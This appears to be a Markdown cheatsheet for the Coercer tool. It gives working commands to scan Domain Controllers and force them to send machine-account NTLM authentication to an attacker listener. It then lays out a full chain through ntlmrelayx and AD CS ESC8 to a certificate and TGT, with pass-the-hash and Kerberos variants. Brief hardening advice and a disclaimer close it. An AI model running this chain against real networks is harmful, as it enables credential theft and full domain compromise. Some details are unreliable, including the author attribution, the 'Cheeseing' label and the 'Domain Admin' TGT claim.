# 🪓 Coercer - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```

<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Automatically scan, detect, and coerce Windows servers and Domain Controllers into authenticating back to arbitrary machines via 12+ RPC protocols</b>
</p>

---

## 📋 Table of Contents

- [Overview & The Authentication Coercion Primitive](#-overview--the-authentication-coercion-primitive)
- [Supported RPC Protocols & Methods](#-supported-rpc-protocols--methods)
- [Installation](#-installation)
- [Scanning for Vulnerable RPC Interfaces (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [Executing Authentication Coercion (`coerce`)](#-executing-authentication-coercion-coerce)
- [The Full Attack Chain: Coercion -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [Protocol & Method Filtering](#-protocol--method-filtering)
- [Kerberos & Pass-the-Hash Support](#-kerberos--pass-the-hash-support)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & The Authentication Coercion Primitive

In Active Directory environments, **authentication coercion** is a devastating offensive primitive. It exploits legacy RPC interfaces implemented in Windows services that allow an authenticated user to ask a remote machine (like a Domain Controller) to connect to a designated UNC path (`\\attacker\share`).

When the remote Windows machine connects to the attacker-controlled machine, it initiates **machine-account NTLM authentication** (`DC01$`). 

By capturing or relaying this machine account credential using `ntlmrelayx` to Active Directory Certificate Services (AD CS Web Enrollment - ESC8) or unconstrained delegation targets, attackers can achieve **immediate full Domain Compromise**.

Authored by **Clément Notin (p0dalirius)**, **Coercer** unifies over a dozen individual coercion exploits (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) into a single, automated, highly modular framework.

---

## 🔌 Supported RPC Protocols & Methods

Coercer tests and exploits the following RPC interfaces:

| Protocol Name | Common Exploit Name | Pipe / Interface |
|---------------|---------------------|------------------|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | PrintNightmare adjacent | Remote Print Administration |
| **MS-SAMR** | Cheeseing | Security Account Manager |

---

## 📥 Installation

```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```

---

## 🔍 Scanning for Vulnerable RPC Interfaces (`scan`)

Before triggering coercion, safely scan target Domain Controllers to discover which RPC functions are enabled and reachable:

```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```

---

## ⚡ Executing Authentication Coercion (`coerce`)

Trigger an outbound machine-account NTLM connection from the target DC to your listener:

```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```

---

## 💥 The Full Attack Chain: Coercion -> NTLM Relay -> AD CS ESC8

The canonical Domain Escalation vector:

```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```

---

## 🎯 Protocol & Method Filtering

Target a specific method without spamming the entire RPC spectrum:

```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```

---

## 🔑 Kerberos & Pass-the-Hash Support

```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Scan DC for Coercion** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Coerce Authentication** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **Coerce via MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Coerce via MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **Pass-the-Hash Coercion** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **Kerberos Ticket Coerce** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Defensive Considerations & Hardening

1. **Disable Print Spooler on DCs:** The Print Spooler service (`spoolsv.exe`) should be completely disabled on Domain Controllers (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **Enable Extended Protection for Authentication (EPA):** On AD CS IIS servers, enable EPA and require HTTPS to block NTLM Relay attacks.
3. **RPC Filtering & Network Segmentation:** Restrict RPC endpoint mapper access (TCP port 135) to authorized administrative subnets.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Coercer triggers active remote authentication calls that can destabilize unpatched domain services. Use exclusively during authorized penetration tests and with explicit customer consent.